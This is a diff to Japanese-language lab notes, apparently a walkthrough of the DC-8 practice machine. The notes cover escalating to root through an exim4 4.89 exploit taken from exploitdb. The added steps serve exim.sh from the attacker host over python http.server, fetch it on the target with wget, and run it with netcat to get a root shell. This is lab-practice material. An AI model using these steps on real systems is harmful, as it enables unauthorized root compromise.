@@ -45,8 +45,14 @@
   - exim4がある。今まで見たことない珍しい 
   - exim4のバージョンを調べる。`/usr/sbin/exim4 --version`
 - exploitdbを調べる
-  - `exim4 4.89`を探してexploitをコピーする 
+  - `exim4 4.89`を探してexploitをコピーする。ファイル名はexim.shにしておく
 - rootになる
-  - `bash exim.sh -m netcat`
+  - exim.shをターゲットのdc8に送る。dc8は/tmpに移動しておく
+    - Parrotで`python -m http.server 8080`
+    - dc8で`wget http://192.168.56.101:8080/exim.sh`
+  - dc8でさっきのコマンドを実行する
+    - `chmod +x exim.sh`
+    - `bash exim.sh -m netcat`
   - しばらく時間を待って、変化したら使える。プロンプトとかないので注意
-  - exim4はnetcatを利用するが、すぐに切れるので注意
+  - exim4はnetcatを利用するが、すぐに切れるので注意。たぶん1分くらい
+  - `id`を見たらrootであることがわかる
